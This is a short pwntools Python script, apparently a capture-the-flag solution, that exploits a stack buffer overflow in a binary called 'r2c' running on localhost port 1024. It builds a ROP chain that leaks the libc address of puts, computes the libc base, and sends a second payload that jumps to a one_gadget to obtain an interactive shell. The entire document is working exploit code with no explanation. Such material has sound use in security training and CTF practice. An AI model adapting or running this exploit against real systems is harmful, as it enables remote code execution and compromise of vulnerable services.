from pwn import *

poprdi = 0x00000000004005e3
callputs = 0x400557
puts_plt = 0x601018
main = 0x0000000000400537
offset = 136

context.arch = "amd64"
context.terminal = ["terminator","--new-tab", "-e"]
libc = ELF("./libc.so.6")
def _u64(b):
    return u64(b.ljust(8, b'\x00'))

#p = process("./r2c_patched")
p = remote("localhost", 1024) 
#gdb.attach(p, '''
#b main
#''')
#input('wait')

p.recvline()

payload = b"A"*128
payload += p64(0x0)

# Leak libc
payload += p64(poprdi) + p64(puts_plt) +p64(0x400430)

payload += p64(0x0000000000400538) + b"B"*8
# Second chance
p.sendline(payload)


p.recvline()
leak = _u64(p.recvline()[:-1])
log.info(f"Got leak: {hex(leak)}")
libc_base = leak-libc.symbols["puts"]
log.info(f"Libc base @ {hex(libc_base)}")
payload = b"A"*128
payload += p64(0xdeadbeef)
payload += p64(libc_base+0x4f302)   # Onegadget
p.sendline(payload)
p.interactive()
